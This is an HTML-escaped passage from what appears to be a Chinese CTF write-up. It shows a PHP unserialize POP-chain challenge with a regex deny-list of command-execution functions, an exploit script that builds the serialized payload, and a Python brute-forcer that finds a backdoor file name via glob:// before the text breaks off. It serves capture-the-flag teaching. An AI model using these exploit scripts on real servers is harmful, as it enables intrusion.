class=&#34;variable&#34;&gt;$hacker&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt;  &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__toString&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;    &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;hacker-&amp;gt;name;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;C&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$finish&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__get&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$value&lt;/span&gt;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;    &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;finish-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;hacker&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;nonono&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;E&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$hacker&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt;  &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__invoke&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$parms1&lt;/span&gt;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;    &lt;/span&gt;&amp;#123;   &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$parms1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;hacker-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;welcome&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;H&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$username&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;admin&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__destruct&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;    &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;welcome&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt;  &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;welcome&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;    &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;welcome~ &amp;quot;&lt;/span&gt;.&lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;username;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;K&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$func&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__call&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$method&lt;/span&gt;,&lt;span class=&#34;variable&#34;&gt;$args&lt;/span&gt;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;    &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;title function_ invoke__&#34;&gt;call_user_func&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$this&lt;/span&gt;-&amp;gt;func,&lt;span class=&#34;string&#34;&gt;&amp;#x27;welcome&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;R&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$method&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$args&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt;  &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;welcome&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;    &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;key === &lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt; &amp;amp;&amp;amp; &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;finish1-&amp;gt;name) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;finish-&amp;gt;finish) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;title function_ invoke__&#34;&gt;call_user_func_array&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$this&lt;/span&gt;-&amp;gt;method,&lt;span class=&#34;variable&#34;&gt;$this&lt;/span&gt;-&amp;gt;args);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;nonono&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$filter&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;quot;/system|exec|passthru|shell_exec|popen|proc_open|pcntl_exec|system|eval|flag/i&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;title function_ invoke__&#34;&gt;preg_replace&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$filter&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;quot;pop&amp;quot;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;title function_ invoke__&#34;&gt;unserialize&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;nonono&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;看似很多内容，实则非常简单，只有两个类是有用的。&lt;/p&gt;
&lt;p&gt;函数调用的出口在 &lt;code&gt;Hacker类&lt;/code&gt; 的 &lt;code&gt;call_user_func()&lt;/code&gt;  中，通过触发 &lt;code&gt;__tostring()&lt;/code&gt;  调用；函数调用的入口在 &lt;code&gt;H类&lt;/code&gt; 的 &lt;code&gt;welcome()&lt;/code&gt;  中，恰好 &lt;code&gt;echo&lt;/code&gt;  函数可以触发 &lt;code&gt;__tostring()&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;完整的利用链条： &lt;code&gt;H类&lt;/code&gt; 的 &lt;code&gt;call_user_func()&lt;/code&gt;  -&amp;gt;  &lt;code&gt;Hacker类&lt;/code&gt; 的 &lt;code&gt;welcome&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;exp 如下：&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;Hacker&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$exp&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$cmd&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;H&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$username&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt; = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title function_ invoke__&#34;&gt;H&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt; -&amp;gt; username = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Hacker&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;title function_ invoke__&#34;&gt;urlencode&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;serialize&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;web2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web2&#34;&gt;#&lt;/a&gt; web2&lt;/h2&gt;
&lt;p&gt;在源码中看到提示&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight javascript&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!-- backdoor_[a-f0-&lt;span class=&#34;number&#34;&gt;9&lt;/span&gt;]&amp;#123;&lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;&amp;#125;.&lt;span class=&#34;property&#34;&gt;php&lt;/span&gt; --&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;使用 glob 协议爆破出文件名&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; requests&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;path = &lt;span class=&#34;string&#34;&gt;&amp;quot;backdoor_&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; j &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;0123456789abcde&amp;quot;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        postdata = &amp;#123;&lt;span class=&#34;string&#34;&gt;&amp;quot;filename&amp;quot;&lt;/span&gt;: &lt;span class=&#34;string&#34;&gt;&amp;quot;glob://&amp;quot;&lt;/span&gt; + path + i + &lt;span class=&#34;string&#34;&gt;&amp;quot;*&amp;quot;&lt;/span&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        fh = requests.post(&lt;span class=&#34;string&#34;&gt;&amp;quot;http://172.10.0.5/&amp;quot;&lt;/span&gt;,data=postdata).text&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;yesyes&amp;quot;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; fh:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            path += i&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(path)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;访问后门地址获得源码&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;highlight_file&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;__FILE__&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;error_reporting&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;username&amp;#x27;&lt;/span&gt;]))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$sandbox&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;/var/www/html/sandbox/&amp;#x27;&lt;/span&gt;.&lt;span class=&#34;title function_ invoke__&#34;&gt;md5&lt;/span&gt;(&lt;span 